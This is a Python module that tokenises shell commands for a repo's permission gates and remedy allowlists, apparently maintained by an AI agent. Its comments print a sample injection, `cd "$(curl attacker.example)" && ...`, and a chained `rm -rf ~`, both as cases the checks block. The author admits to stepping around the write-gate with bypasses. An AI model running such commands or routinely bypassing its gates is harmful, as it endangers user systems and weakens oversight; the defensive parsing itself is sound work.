"""One place that knows a shell command's head is not its first character.

WHY THIS MODULE EXISTS (Aletheia F70 shape, named 2026-08-18).

Three separate sites in this repo have independently learned that
``VAR=1 divineos correction`` and ``divineos correction`` are the same
command wearing different clothes, and each learned it by shipping a
matcher that got it wrong first:

  - 2026-07-25, the verify-before-build signal: substring-matching the raw
    text, which false-fired on ``--command "divineos decide"`` as an
    argument. Aria's review. Fixed with ``_resolve_command_head``.
  - 2026-07-31, F107: ``cd X && divineos Y`` rejected while bare
    ``divineos Y`` passed.
  - 2026-08-18, the shared remedy allowlist: a leading env assignment made
    a gate's own prescribed remedy invisible to the list that keeps the
    gate's door open, so the compass marker blocked ``compass-ops observe``
    and then blocked the edit that would repair it.

The third one is mine, and I wrote it while repairing a duplicate-resolver
bug in the token gauge, in the same commit that says the resolver lives in
one place now. The correct implementation was already here. Measured, the
version I hand-rolled missed three of five cases this one handles —
including a quoted value with a space, which I wrote up as a known limit
rather than checking whether anyone had solved it.

So: the stripping lives here, once, and both the Python gate and the bash
allowlist call it. Adding a fourth site means importing this, not writing
a fourth loop.
"""

from __future__ import annotations

import re
import shlex


_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
"""A leading ``NAME=value`` token, which bash treats as an assignment
rather than as the command."""


def strip_command_prefixes(bash_command: str) -> list[str]:
    """Return the command's tokens with leading noise removed.

    Strips, repeatedly and in any order:

      - ``cd <path> &&`` segments, so a command issued from a worktree
        reads the same as one issued from the repo root
      - a leading ``env`` invocation
      - ``NAME=value`` assignments

    ``shlex`` does the tokenising, which is why a quoted value containing
    spaces survives — the failure mode of every regex version of this.
    On malformed quoting it falls back to a whitespace split rather than
    raising, because every caller is a gate and a gate that crashes is
    worse than a gate that is approximate.

    Returns an empty list for an empty command, or for one that is
    nothing but prefixes.
    """
    if not bash_command:
        return []
    try:
        tokens = shlex.split(bash_command, posix=True)
    except ValueError:
        tokens = bash_command.strip().split()

    changed = True
    while changed and tokens:
        changed = False

        # `cd <path> &&` — drop through the `&&` and keep going.
        if tokens[0] == "cd":
            try:
                sep = tokens.index("&&")
            except ValueError:
                # `cd somewhere` with nothing after it is not a prefix on
                # anything; there is no command behind it to find.
                return []
            tokens = tokens[sep + 1 :]
            changed = True
            continue

        if tokens[0].lower() == "env":
            tokens = tokens[1:]
            changed = True
            continue

        if _ENV_ASSIGN_RE.match(tokens[0]):
            tokens = tokens[1:]
            changed = True
            continue

    return tokens


def resolve_command_head(bash_command: str) -> str:
    """The first two real tokens, lowercased — e.g. ``"git commit"``.

    Exact-matching against this rather than substring-searching the raw
    text is what stops ``authorize-bypass --command "divineos decide"``
    reading as an invocation of ``divineos decide``.
    """
    real = strip_command_prefixes(bash_command)
    if not real:
        return ""
    if len(real) >= 2:
        return f"{real[0].lower()} {real[1].lower()}"
    return real[0].lower()


def stripped_command(bash_command: str) -> str:
    """The whole command with its leading noise removed, re-joined.

    Callers that match against more than two tokens want this — the
    remedy allowlist distinguishes ``compass-ops observe`` from
    ``compass-ops dismiss``, which a two-token head cannot express.
    """
    return " ".join(strip_command_prefixes(bash_command))


# 2026-08-19 (Aletheia F114). A caller that must run a QUOTE-AWARE check on what
# is left after the prefixes cannot use stripped_command(): that re-joins shlex
# tokens, which drops the quoting. A semicolon inside an evidence string comes
# back out naked, so a chain-shape check on the re-joined text would reject a
# perfectly legitimate remedy.
#
# So this returns the ORIGINAL TEXT with only the leading prefixes removed,
# byte-for-byte from the first real token onward.
# 2026-08-19, SECOND PASS. The first version of the cd pattern accepted any
# non-space run as the directory, and a quoted directory as any characters at
# all. That is weaker than the bespoke _CD_PREFIX_RE it was meant to replace,
# whose comment records it as the tactical block on an actual exploit -- and I
# only found out by testing the two against each other instead of assuming the
# shared one was the better one because it was the shared one.
#
#     cd "$(curl attacker.example)" && divineos correction "x"
#
# The first version stripped that whole prefix as benign, handed a clean remedy
# to the chain check, and the gate returned SAFE. The substitution never got
# looked at because it had already been thrown away.
#
# So the directory may not contain a substitution or a chain operator, in either
# the quoted or the unquoted form. Same exclusions as _CD_PREFIX_RE.
_CD_RAW_RE = re.compile(r"""^\s*cd\s+(?:["'][^"'$`]+["']|[^\s;&|`$]+)\s*&&\s*""")
_ENV_RAW_RE = re.compile(r"^\s*env\s+")
_ASSIGN_RAW_RE = re.compile(
    r"""^\s*[A-Za-z_][A-Za-z0-9_]*=(?:"[^"$`]*"|'[^'$`]*'|[^\s;&|`$]*)\s+"""
)

CD = "cd"
ENV = "env"
ASSIGN = "assign"
_RAW_PREFIX_PATTERNS = {CD: _CD_RAW_RE, ENV: _ENV_RAW_RE, ASSIGN: _ASSIGN_RAW_RE}
ALL_PREFIX_KINDS = (CD, ENV, ASSIGN)


def strip_prefixes_raw(bash_command: str, kinds: tuple[str, ...] = ALL_PREFIX_KINDS) -> str:
    """The command with leading ``cd <path> &&`` / ``env`` / ``NAME=value``
    removed and everything after preserved verbatim.

    Use this when the remainder still has to be inspected AS SHELL TEXT --
    quote-aware chain detection, for instance. Use stripped_command() when the
    remainder only needs comparing token-wise.

    Removing the ``cd ... &&`` prefix does not weaken a chain check applied to
    the result: what gets removed is provably just a directory change, and any
    OTHER chain operator survives into the returned string. So
    ``cd X && divineos correction "y" && rm -rf ~`` still returns text
    containing ``&& rm -rf ~`` and is still caught.
    """
    if not bash_command:
        return ""
    text = bash_command
    changed = True
    while changed:
        changed = False
        for kind in kinds:
            pattern = _RAW_PREFIX_PATTERNS.get(kind)
            if pattern is None:
                continue
            new_text = pattern.sub("", text, count=1)
            if new_text != text:
                text = new_text
                changed = True
    return text.strip()


# A segment that could execute something nobody inspected before the remedy
# runs. The exploit this preserves is recorded above: `cd "$(curl attacker)" &&
# divineos correction "x"` must NOT read as a clean remedy, because the
# substitution is discarded with the prefix and never looked at.
_UNSAFE_IN_PREFIX = re.compile(r"[`$]")


def remedy_segment(bash_command: str) -> str:
    """The segment a remedy allowlist should match against, or empty.

    WHY THIS EXISTS is written one function up, before the incident that needed
    it: "this matcher reads SHELL with a regex that only knows bare
    invocations, so every legal prefix shell permits is a fresh hole -- `cd x
    &&`, `VAR=1`, and whatever turns up next. If a fourth prefix appears the
    answer is to parse the command, not to add a fourth loop."

    The fourth appeared 2026-09-11: `set -o pipefail && divineos correction`.
    The marker gate refused its own prescribed remedy, told me to run the
    command I was running, and I got through by dropping a habit rather than by
    being right. Four occurrences, four different prefixes, each patched alone,
    each patch carrying a note predicting the next -- that is a system
    speaking, and the controller had less variety than shell does, so no number
    of additions could ever have closed it.

    So this stops asking WHAT PREFIX and asks WHETHER A REMEDY IS INVOKED. A
    remedy anywhere in a chain is a remedy being run, and what was typed before
    it does not change that -- unless what was typed before could execute
    something unexamined.

    Two guards, and neither is decoration:

      * every earlier segment must be free of substitution and backticks, which
        is the exclusion the cd-prefix pattern already carried, generalised
        from one position to all of them;
      * pipelines are NOT split, because what follows a pipe consumes output
        rather than being invoked, and splitting there would let `echo x |
        divineos correction` read as a filing that never happened.

    Returns EVERY safe segment, prefixes stripped, newline-joined -- not the
    first one. The first draft returned the first real segment and the check
    that caught it was running the thing rather than reasoning about it: for
    `cd x && set -o pipefail && divineos correction`, the first real segment is
    the shell-option, and the remedy is last. Callers grep with a start-anchored
    pattern, and grep tests each line independently, so joining with newlines
    means every segment gets the anchor without the caller changing at all.

    Returns "" when any earlier segment is unsafe -- the whole command is
    refused rather than the offending segment skipped, because the unsafe part
    still runs.
    """
    if not bash_command:
        return ""

    segments = re.split(r"&&|\|\||;", bash_command)
    safe: list[str] = []

    for index, segment in enumerate(segments):
        candidate = stripped_command(segment)
        if not candidate:
            continue
        if any(_UNSAFE_IN_PREFIX.search(earlier) for earlier in segments[:index]):
            return ""
        safe.append(candidate)
    return "\n".join(safe)


# ------------------------------------------------------- files a command writes
#
# 2026-09-23. The work-item doorman found these with regexes over text whose
# quoted spans had been blanked to spaces, and a regex's `\s+` walks straight
# across a blank, across `&&` and across a newline into the NEXT command. In one
# session it named `ls`, `-c`, `2` and `.venv/Scripts/python.exe` as files being
# written, and I stepped around it with a bypass each time instead of fixing it.
# The same blanking made a quoted destination -- `cp a "src/x.py"` -- invisible:
# a hole nobody had seen, because false holds are loud and misses are silent.
#
# The module docstring above predicted this: "If a fourth prefix appears the
# answer is to parse the command, not to add a fourth loop." So the doorman now
# asks here, and the reading is the shell's own: quotes stay whole, a line
# break ends a command, a heredoc body is data.

_HEREDOC_OPEN = re.compile(r"<<-?\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1")


def strip_quoted_heredocs(cmd: str) -> str:
    """Remove the bodies of heredocs whose delimiter is quoted. Those bodies are
    data -- a body quoting ``> src/x.py`` writes nothing. The opening line stays,
    so ``cat > src/x.py <<'EOF'`` still shows its write.

    AN UNQUOTED HEREDOC IS NOT STRIPPED (Knuth, on the doorman's 2026-09-22
    walk): the shell expands inside one, so a write can genuinely live there. A
    heredoc whose terminator never appears is malformed, and the conservative
    reading is to scan all of it. Carried here from the doorman's
    shell_code_only when the doorman started asking this module.
    """
    out = cmd
    for match in list(_HEREDOC_OPEN.finditer(cmd)):
        quote, word = match.group(1), match.group(2)
        if not quote:
            continue
        body_start = out.find(match.group(0))
        if body_start == -1:
            continue
        body_start += len(match.group(0))
        terminator = re.search(rf"^\s*{re.escape(word)}\s*$", out[body_start:], re.MULTILINE)
        if terminator is None:
            continue
        out = out[:body_start] + " " + out[body_start + terminator.end() :]
    return out


def _strip_comments(cmd: str) -> str:
    """Drop shell comments the way the shell does: ``#`` at the start of a word,
    outside quotes, to the end of the line.

    shlex's own comment handling ends a word at ANY ``#``, so
    ``curl http://a/b#frag > out.txt`` lost its redirect -- a real write hidden.
    """
    out: list[str] = []
    quote = ""
    i = 0
    while i < len(cmd):
        ch = cmd[i]
        if quote:
            if ch == "\\" and quote == '"' and i + 1 < len(cmd):
                out.append(cmd[i : i + 2])
                i += 2
                continue
            if ch == quote:
                quote = ""
        elif ch in "'\"":
            quote = ch
        elif ch == "\\" and i + 1 < len(cmd):
            out.append(cmd[i : i + 2])
            i += 2
            continue
        elif ch == "#" and (i == 0 or cmd[i - 1] in " \t\n;&|()"):
            end = cmd.find("\n", i)
            if end == -1:
                break
            i = end
            continue
        out.append(ch)
        i += 1
    return "".join(out)


_OPERATOR_CHARS = "();<>|&\n"
_SEPARATOR_CHARS = frozenset(";&|\n()")
_WRITE_REDIRECTS = frozenset({">", ">>", ">|", "&>", "&>>"})
_DUP_REDIRECT = ">&"


_LITERAL_OPERATOR = "QUOTEDOP"


def _neutralise_literal_operators(cmd: str) -> str:
    """A quoted or backslashed operator is a WORD, and must stay one.

    shlex drops the quotes, so ``[ x '>' 5.0 ]`` -- a string comparison -- came
    back as a redirect to ``5.0``, and ``echo \\>`` as a redirect too. Found by
    replaying every command in this house's transcripts through the old reader
    and this one: the single new false hold in 22,844 commands. A quoted span
    made only of operator characters, or a backslash before one, is replaced by
    a plain word before lexing. Quote-aware, so the separator in
    ``"a" ; "b"`` is left alone.
    """
    out: list[str] = []
    i = 0
    n = len(cmd)
    while i < n:
        ch = cmd[i]
        if ch == "\\" and i + 1 < n:
            out.append(_LITERAL_OPERATOR if cmd[i + 1] in _OPERATOR_CHARS else cmd[i : i + 2])
            i += 2
            continue
        if ch in "'\"":
            j = i + 1
            while j < n and cmd[j] != ch:
                j += 2 if (ch == '"' and cmd[j] == "\\") else 1
            span = cmd[i : j + 1]
            inner = span[1:-1]
            if inner and set(inner) <= set(_OPERATOR_CHARS + " \t"):
                out.append(_LITERAL_OPERATOR)
            else:
                out.append(span)
            i = j + 1
            continue
        out.append(ch)
        i += 1
    return "".join(out)


def _shell_tokens(cmd: str) -> list[str]:
    cmd = _neutralise_literal_operators(cmd)
    lexer = shlex.shlex(cmd, posix=True, punctuation_chars=_OPERATOR_CHARS)
    lexer.whitespace = " \t\r"
    lexer.whitespace_split = True
    lexer.commenters = ""
    try:
        return list(lexer)
    except ValueError:
        # Malformed quoting. Approximate rather than crash: every caller is a
        # gate, and this module's convention is that a crashing gate is worse.
        return cmd.split()


def _commands(tokens: list[str]) -> list[list[str]]:
    """Split on separators. A punctuation run such as ``;\\n`` or ``&&`` is one
    token, so any token made only of separator characters ends a command."""
    out: list[list[str]] = [[]]
    for tok in tokens:
        if tok and set(tok) <= _SEPARATOR_CHARS:
            out.append([])
        else:
            out[-1].append(tok)
    return [c for c in out if c]


def _split_redirects(command: list[str]) -> tuple[list[str], list[str]]:
    """(arguments, redirect targets). A descriptor digit written before a
    redirect is part of the redirect, not an argument -- ``cp a b 2>/dev/null``
    copies to ``b``, not to ``2``."""
    args: list[str] = []
    targets: list[str] = []
    i = 0
    while i < len(command):
        tok = command[i]
        nxt = command[i + 1] if i + 1 < len(command) else None
        is_redirect = tok in _WRITE_REDIRECTS or tok == _DUP_REDIRECT or tok.startswith("<")
        if is_redirect:
            if args and args[-1].isdigit():
                args.pop()
            if nxt is not None:
                if tok in _WRITE_REDIRECTS:
                    targets.append(nxt)
                elif tok == _DUP_REDIRECT and not (nxt.isdigit() or nxt == "-"):
                    targets.append(nxt)
                i += 2
                continue
        args.append(tok)
        i += 1
    return args, targets


def _command_word(args: list[str]) -> tuple[str, list[str]]:
    rest = list(args)
    while rest and (_ENV_ASSIGN_RE.match(rest[0]) or rest[0] in ("env", "command", "sudo")):
        rest = rest[1:]
    if not rest:
        return "", []
    return rest[0].rsplit("/", 1)[-1].lower(), rest[1:]


def _positional(args: list[str]) -> list[str]:
    return [a for a in args if not a.startswith("-")]


def _sed_in_place_files(args: list[str]) -> list[str]:
    if not any(
        a == "-i"
        or (a.startswith("-") and not a.startswith("--") and "i" in a)
        or a.startswith("--in-place")
        for a in args
    ):
        return []
    script_by_option = any(
        a in ("-e", "-f", "--expression", "--file") or a.startswith(("--expression=", "--file="))
        for a in args
    )
    files: list[str] = []
    skip_next = False
    for a in args:
        if skip_next:
            skip_next = False
            continue
        if a in ("-e", "-f", "--expression", "--file"):
            skip_next = True
            continue
        if not a.startswith("-"):
            files.append(a)
    return files if script_by_option else files[1:]


def shell_write_targets(cmd: str) -> list[str]:
    """Every file this shell command writes that can be read off its text.

    Covers redirects, ``tee``, ``cp``/``mv``/``install`` destinations,
    ``sed -i`` files and ``patch``. What it CANNOT see, and says so rather than
    implying completeness: writes made by a program the command runs (``python
    -c`` opening a file, a script in a scratch folder), and targets built from
    variables. Callers that must catch those need a second instrument -- the
    doorman's is what changed on disk.
    """
    if not cmd:
        return []
    text = _strip_comments(strip_quoted_heredocs(cmd))
    found: list[str] = []
    for command in _commands(_shell_tokens(text)):
        args, targets = _split_redirects(command)
        found.extend(targets)
        word, rest = _command_word(args)
        positional = _positional(rest)
        if word == "tee":
            found.extend(positional)
        elif word in ("cp", "mv", "install") and len(positional) >= 2:
            found.append(positional[-1])
        elif word == "git" and positional[:1] == ["mv"] and len(positional) >= 3:
            # The old regexes caught this by accident, finding "mv" inside "git
            # mv". Reading the real command word lost it, and the replay of
            # every past command is what showed the loss.
            found.append(positional[-1])
        elif word == "sed":
            found.extend(_sed_in_place_files(rest))
        elif word == "patch" and positional:
            found.append(positional[0])
    # A target that begins with '=' is the tail of a comparison (`n >= 0`), not
    # a file anybody means to write.
    return [t for t in found if t and not t.startswith("=")]
